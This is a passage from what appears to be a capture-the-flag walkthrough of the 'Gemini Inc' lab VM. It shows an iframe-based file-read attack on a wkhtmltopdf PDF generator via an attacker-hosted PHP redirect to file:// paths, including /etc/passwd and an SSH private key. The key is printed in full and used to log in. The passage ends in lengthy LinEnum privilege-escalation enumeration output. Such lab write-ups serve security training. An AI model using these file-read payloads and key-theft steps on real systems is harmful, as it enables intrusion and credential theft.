connect to [192.168.1.13] from (UNKNOWN) [192.168.1.14] 51146
GET /a HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Referer: http://192.168.1.14/test2/profile.php?u=1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 192.168.1.13:1337
```

`redirect.php`

```sh
<?php
	header('location:file:///etc/passwd');
?>
```

```php
<iframe src="http://192.168.1.13:8000/redirect.php"></iframe>
```

```sh
root@kali:~/gemini# php -S 192.168.1.13:8000
PHP 7.2.3-1 Development Server started at Sat May 19 16:32:07 2018
Listening on http://192.168.1.13:8000
Document root is /root/gemini
Press Ctrl-C to quit.
[Sat May 19 16:32:18 2018] 192.168.1.14:32960 [302]: /redirect.php
```

![](images/26.png)

![](images/27.png)

```html
<iframe src="http://192.168.1.13:8000/redirect.php" height="1000" weight="1000"></iframe>
```

![](images/28.png)

```sh
root@kali:~/gemini# cat redirect.php
<?php
	header('location:file:///home/gemini1/.bashrc');
?>
root@kali:~/gemini#
root@kali:~/gemini# php -S 192.168.1.13:8000
PHP 7.2.3-1 Development Server started at Sat May 19 16:39:56 2018
Listening on http://192.168.1.13:8000
Document root is /root/gemini
Press Ctrl-C to quit.
[Sat May 19 16:40:19 2018] 192.168.1.14:33058 [302]: /redirect.php
```

```html
<iframe src="http://192.168.1.13:8000/redirect.php" height="1000" weight="1000"></iframe>
```

![](images/29.png)

![](images/30.png)

```sh
root@kali:~/gemini# cat redirect.php
<?php
	header('location:file:///home/gemini1/.ssh/authorized_keys');
?>
root@kali:~/gemini#
root@kali:~/gemini# php -S 192.168.1.13:8000
PHP 7.2.3-1 Development Server started at Sat May 19 16:42:45 2018
Listening on http://192.168.1.13:8000
Document root is /root/gemini
Press Ctrl-C to quit.
[Sat May 19 16:43:26 2018] 192.168.1.14:33080 [302]: /redirect.php
```

```html
<iframe src="http://192.168.1.13:8000/redirect.php" height="1000" weight="1000"></iframe>
```

![](images/31.png)

![](images/32.png)

```sh
root@kali:~/gemini# cat redirect.php
<?php
	header('location:file:///home/gemini1/.ssh/id_rsa');
?>
root@kali:~/gemini#
root@kali:~/gemini# php -S 192.168.1.13:8000
PHP 7.2.3-1 Development Server started at Sat May 19 16:47:13 2018
Listening on http://192.168.1.13:8000
Document root is /root/gemini
Press Ctrl-C to quit.
[Sat May 19 16:47:20 2018] 192.168.1.14:33100 [302]: /redirect.php
```

```html
<iframe src="http://192.168.1.13:8000/redirect.php" height="1000" weight="1000"></iframe>
```

![](images/33.png)

![](images/34.png)

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAv8sYkCmUFupwQ8pXsm
0XCAyxcR6m5y9GfRWmQmrvb9qJP3xs
6c11dX9Mi8OLBpKuB+Y08aTgWbEtUAkVEpRU
+mk+wpSx54OTBMFX35x4snzz+X5u
Vl1rUn9Z4QE5SJpOvfV3Ddw9zlVA0MCJGi/RW
4ODRYmPHesqNHaMGKqTnRmn3/4V
u7cl+KpPZmQJzASoffyBn1bxQomqTkb5AGhkA
ggsOPS0xv6P2g/mcmMUIRWaTH4Z
DqrpqxFtJbuWSszPhuw3LLqAYry0RlEH/Mdi2Rx
M3VZvqDRlsV0DO74qyBhBsq+p
oSbdwoXao8n7oO2ASHc05d2vtmmmGP31+4pj
uQIDAQABAoIBAQCq+WuJQHeSwiWY
WS46kkNg2qfoNrIFD8Dfy0ful5OhfAiz/sC84HrgZ
r4fLg+mqWXZBuCVtiyF6IuD
eMU/Tdo/bUkUfyflQgbyy0UBw2RZgUihVpMYDK
ma3oqKKeQeE+k0MDmUsoyqfpeM
QMc3//67fQ6uE8Xwnu593FxhtNZoyaYgz8LTpY
Rsaoui9j7mrQ4Q19VOQ16u4XlZ
rVtRFjQqBmAKeASTaYpWKnsgoFudp6xyxWzS
4uk6BlAom0teBwkcnzx9fNd2vCYR
MhK5KLTDvWUf3d+eUcoUy1h+yjPvdDmlC27vc
vZ0GXVvyRks+sjbNMYWl+QvNIZn
1XxD1nkxAoGBAODe4NKq0r2Biq0V/97xx76oz5
zX4drh1aE6X+osRqk4+4soLauI
xHaApYWYKlk4OBPMzWQC0a8mQOaL1LalYS
EL8wKkkaAvfM604f3fo01rMKn9vNRC
1fAms6caNqJDPIMvOyYRe4PALNf6Yw0Hty0Ko
wC46HHkmWEgw/pEhOZdAoGBANpY
AJEhiG27iqxdHdyHC2rVnA9o2t5yZ7qqBExF7zy
UJkIbgiLLyliE5JYhdZjd+abl
aSdSvTKOqrxscnPmWVIxDyLDxemH7iZsEbhL
kIsSKgMjCDhPBROivyQGfY17EHPu
968rdQsmJK8+X5aWxq08VzlKwArm+GeDs2hrC
GUNAoGAc1G5SDA0XNz3CiaTDnk9
r0gRGGUZvU89aC5wi73jCttfHJEhQquj3QXCXM
2ZQiHzmCvaVOShNcpPVCv3jSco
tXLUT9GnoNdZkQPwNWqf648B6NtoIA6aekrOr
O5jgDks6jWphq9GgV1nYedVLpR7
WszupOsuwWGzSr0r48eJxD0CgYEAo23HTtpIo
coEbCtulIhIVXj5zNbxLBt55NAp
U2XtQeyqDkVEzQK4vDUMXAtDWF6d5PxGDvb
xQoxi45JQwMukA89QwvbChqAF86Bk
SwvUbyPzalGob21GIYJpi2+IPoPktsIhhm4Ct4uf
XcRUDAVjRHur1ehLgl2LhP+h
JAEpUWkCgYEAj2kz6b+FeK+xK+FUuDbd88vj
U6FB8+FL7mQFQ2Ae9IWNyuTQSpGh
vXAtW/c+eaiO4gHRz60wW+FvItFa7kZAmylCAu
gK1m8/Ff5VZ0rHDP2YsUHT4+Bt
j8XYDMgMA8VYk6alU2rEEzqZlru7BZiwUnz7QL
zauGwg8ohv1H2NP9k=
-----END RSA PRIVATE KEY-----
```

```sh
root@kali:~/gemini# chmod 600 gemini1-id-rsa
```

```sh
root@kali:~/gemini# ssh -i gemini1-id-rsa gemini1@192.168.1.14
The authenticity of host '192.168.1.14 (192.168.1.14)' can't be established.
ECDSA key fingerprint is SHA256:NCuNy0GR73dXwSo1wIAT5a3r5Htarfgro5I70oTRuNk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.14' (ECDSA) to the list of known hosts.
Linux geminiinc 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  9 08:04:52 2018 from 192.168.0.112
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ /sbin/ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:65:22:bd  txqueuelen 1000  (Ethernet)
        RX packets 1098486  bytes 187807991 (179.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 991982  bytes 445830739 (425.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 1530  bytes 1374736 (1.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1530  bytes 1374736 (1.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

gemini1@geminiinc:~$
```

###### Privilege Escalation

```sh
gemini1@geminiinc:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2018-05-19 17:01:46--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 42150 (41K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  41.16K  --.-KB/s    in 0.02s

2018-05-19 17:01:47 (2.13 MB/s) - ‘LinEnum.sh’ saved [42150/42150]

gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ bash LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
#

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Sat May 19 17:01:53 EDT 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux geminiinc 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.9.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23)


[-] Specific release information:
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


[-] Hostname:
geminiinc


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Tue Jan  9 08:07:05 -0500 2018
gemini1          pts/0    192.168.1.13     Sat May 19 16:53:13 -0400 2018


[-] Who else is logged on:
 17:01:53 up  3:08,  1 user,  load average: 0.14, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
gemini1  pts/0    192.168.1.13     16:53    9.00s  0.40s  0.00s w


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=109(geoclue) gid=115(geoclue) groups=115(geoclue)
uid=112(avahi) gid=119(avahi) groups=119(avahi)
uid=113(colord) gid=120(colord) groups=120(colord)
uid=114(saned) gid=121(saned) groups=121(saned),118(scanner)
uid=115(hplip) gid=7(lp) groups=7(lp)
uid=116(Debian-gdm) gid=122(Debian-gdm) groups=122(Debian-gdm)
uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
uid=117(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=118(mysql) gid=123(mysql) groups=123(mysql)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
geoclue:x:109:115::/var/lib/geoclue:/bin/false
avahi:x:112:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:113:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:114:121::/var/lib/saned:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
gemini1:x:1000:1000:gemini-sec,,,:/home/gemini1:/bin/bash
sshd:x:117:65534::/run/sshd:/usr/sbin/nologin
mysql:x:118:123:MySQL Server,,,:/nonexistent:/bin/false


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root    root    4.0K Jan  6 08:46 .
drwxr-xr-x 23 root    root    4.0K Jan  6 08:32 ..
drwxr-xr-x  7 gemini1 gemini1 4.0K May 19 17:01 gemini1


### ENVIRONMENTAL #######################################
[-] Environment information:
SSH_CONNECTION=192.168.1.13 50398 192.168.1.14 22
LANG=en_US.UTF-8
XDG_SESSION_ID=9
USER=gemini1
PWD=/home/gemini1
HOME=/home/gemini1
LC_CTYPE=en_US.UTF-8
SSH_CLIENT=192.168.1.13 50398 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/gemini1
SHELL=/bin/bash
TERM=xterm-256color
SHLVL=2
LOGNAME=gemini1
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
_=/usr/bin/env


[-] Path information:
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 May  3  2015 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Jan  6 09:10 .
drwxr-xr-x 108 root root 12288 May 19 12:49 ..
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   712 Jan  1  2017 php
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root  4096 Jan  7 07:03 .
drwxr-xr-x 108 root root 12288 May 19 12:49 ..
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Sep 19  2017 apache2
-rwxr-xr-x   1 root root  1474 Sep 13  2017 apt-compat
-rwxr-xr-x   1 root root   355 Oct 25  2016 bsdmainutils
-rwxr-xr-x   1 root root  1597 Feb 22  2017 dpkg
-rwxr-xr-x   1 root root    89 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1065 Dec 13  2016 man-db
-rwxr-xr-x   1 root root   249 May 17  2017 passwd
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Jan  6 08:09 .
drwxr-xr-x 108 root root 12288 May 19 12:49 ..
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Jan  6 08:32 .
drwxr-xr-x 108 root root 12288 May 19 12:49 ..
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Jan  6 08:32 .
drwxr-xr-x 108 root root 12288 May 19 12:49 ..
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Dec 13  2016 man-db
-rw-r--r--   1 root root   102 May  3  2015 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 401 May 29  2017 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# These replace cron's entries
1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 Jan  6 08:56 .
drwxr-xr-x 5 root root 4096 Jan  7 06:57 ..
-rw------- 1 root root    9 May 19 12:54 cron.daily
-rw------- 1 root root    9 May 19 13:04 cron.monthly
-rw------- 1 root root    9 May 19 12:59 cron.weekly


[-] Jobs held by all users:
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
@reboot /etc/init.d/setup_hostname.sh


### NETWORKING  ##########################################
[-] Network and IP info:
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:65:22:bd  txqueuelen 1000  (Ethernet)
        RX packets 1099731  bytes 188005790 (179.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 992640  bytes 445966395 (425.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 1530  bytes 1374736 (1.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1530  bytes 1374736 (1.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
192.168.1.1 dev ens33 lladdr a0:63:91:f0:cc:4b REACHABLE
192.168.1.13 dev ens33 lladdr 00:0c:29:6c:85:95 REACHABLE
192.168.1.5 dev ens33 lladdr f4:0f:24:33:5e:d1 STALE
192.168.1.67 dev ens33 lladdr 00:0c:29:6c:85:95 STALE


[-] Nameserver(s):
nameserver 192.168.1.1


[-] Nameserver(s):
Global
         DNS Servers: 192.168.1.1
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 2 (ens33)
      Current Scopes: LLMNR/IPv4 LLMNR/IPv6
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[-] Default route:
default via 192.168.1.1 dev ens33 proto static metric 100


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.14:22         192.168.1.13:50398      ESTABLISHED -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::5355                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 0.0.0.0:5355            0.0.0.0:*                           -
udp        0      0 0.0.0.0:38406           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           -
udp6       0      0 :::47824                :::*                                -
udp6       0      0 :::5353                 :::*                                -
udp6       0      0 :::5355                 :::*                                -


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  1.3 204436  6736 ?        Ss   13:52   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:52   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    13:52   0:04 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   13:52   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    13:52   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    13:52   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    13:52   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S<   13:52   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    13:52   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    13:52   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    13:52   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   13:52   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    13:52   0:00 [khungtaskd]
root        16  0.0  0.0      0     0 ?        S    13:52   0:00 [oom_reaper]
root        17  0.0  0.0      0     0 ?        S<   13:52   0:00 [writeback]
root        18  0.0  0.0      0     0 ?        S    13:52   0:00 [kcompactd0]
root        19  0.0  0.0      0     0 ?        SN   13:52   0:00 [ksmd]
root        21  0.0  0.0      0     0 ?        S<   13:52   0:00 [crypto]
root        22  0.0  0.0      0     0 ?        S<   13:52   0:00 [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   13:52   0:00 [bioset]
root        24  0.0  0.0      0     0 ?        S<   13:52   0:00 [kblockd]
root        25  0.0  0.0      0     0 ?        S<   13:52   0:00 [devfreq_wq]
root        26  0.0  0.0      0     0 ?        S<   13:52   0:00 [watchdogd]
root        27  0.0  0.0      0     0 ?        S    13:52   0:00 [kswapd0]
root        28  0.0  0.0      0     0 ?        S<   13:52   0:00 [vmstat]
root        40  0.0  0.0      0     0 ?        S<   13:52   0:00 [kthrotld]
root        41  0.0  0.0      0     0 ?        S<   13:52   0:00 [ipv6_addrconf]
root        82  0.0  0.0      0     0 ?        S<   13:52   0:00 [ata_sff]
root        83  0.0  0.0      0     0 ?        S<   13:52   0:00 [mpt_poll_0]
root        84  0.0  0.0      0     0 ?        S<   13:52   0:00 [mpt/0]
root       112  0.0  0.0      0     0 ?        S    13:52   0:00 [scsi_eh_0]
root       113  0.0  0.0      0     0 ?        S<   13:52   0:00 [scsi_tmf_0]
root       115  0.0  0.0      0     0 ?        S<   13:52   0:00 [bioset]
root       116  0.0  0.0      0     0 ?        S    13:52   0:00 [scsi_eh_1]
root       117  0.0  0.0      0     0 ?        S<   13:52   0:00 [scsi_tmf_1]
root       119  0.0  0.0      0     0 ?        S    13:52   0:00 [scsi_eh_2]
root       122  0.0  0.0      0     0 ?        S<   13:52   0:00 [scsi_tmf_2]
root       137  0.0  0.0      0     0 ?        S<   13:52   0:00 [bioset]
root       139  0.0  0.0      0     0 ?        S<   13:52   0:00 [kworker/0:1H]
root       174  0.0  0.0      0     0 ?        S    13:53   0:00 [jbd2/sda1-8]
root       175  0.0  0.0      0     0 ?        S<   13:53   0:00 [ext4-rsv-conver]
root       199  0.0  0.9  55560  4768 ?        Ss   13:53   0:00 /lib/systemd/systemd-journald
root       206  0.0  0.0      0     0 ?        S    13:53   0:00 [kauditd]
root       229  0.0  0.9  47328  4980 ?        Ss   13:53   0:00 /lib/systemd/systemd-udevd
systemd+   265  0.0  0.8 129344  4196 ?        Ssl  13:53   0:00 /lib/systemd/systemd-timesyncd
root       304  0.0  0.0      0     0 ?        S<   13:53   0:00 [nfit]
root       321  0.0  0.0      0     0 ?        S<   13:53   0:00 [ttm_swap]
root       386  0.0  0.5  29664  2836 ?        Ss   13:53   0:00 /usr/sbin/cron -f
root       397  0.0  1.7 422580  8804 ?        Ssl  13:53   0:00 /usr/sbin/ModemManager
avahi      399  0.0  0.7  47276  3640 ?        Ss   13:53   0:03 avahi-daemon: running [geminiinc.local]
root       401  0.0  0.6 250116  3312 ?        Ssl  13:53   0:00 /usr/sbin/rsyslogd -n
root       408  0.0  0.9  46420  4780 ?        Ss   13:53   0:00 /lib/systemd/systemd-logind
message+   409  0.0  0.7  45248  3996 ?        Ss   13:53   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       413  0.0  3.3 407240 16732 ?        Ssl  13:53   0:05 /usr/sbin/NetworkManager --no-daemon
avahi      426  0.0  0.0  47016   356 ?        S    13:53   0:00 avahi-daemon: chroot helper
root       459  0.0  1.2 286132  6092 ?        Ssl  13:53   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       464  0.0  5.0 248864 25484 ?        Ss   13:53   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
root       491  0.0  0.3  14536  1800 tty1     Ss+  13:53   0:00 /sbin/agetty --noclear tty1 linux
root       515  0.0  1.2  69944  6120 ?        Ss   13:53   0:00 /usr/sbin/sshd -D
www-data   584  0.0  0.9 248864  4816 ?        S    13:53   0:00 php-fpm: pool www
www-data   585  0.0  0.9 248864  4816 ?        S    13:53   0:00 php-fpm: pool www
mysql      623  0.0 15.7 653520 79548 ?        Ssl  13:53   0:07 /usr/sbin/mysqld
root       624  0.0  0.8  20472  4284 ?        S    13:53   0:00 /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-ens33.pid -lf /var/lib/NetworkManager/dhclient-8679cd32-61ec-42fa-8380-cc595a943518-ens33.lease -cf /var/lib/NetworkManager/dhclient-ens33.conf ens33
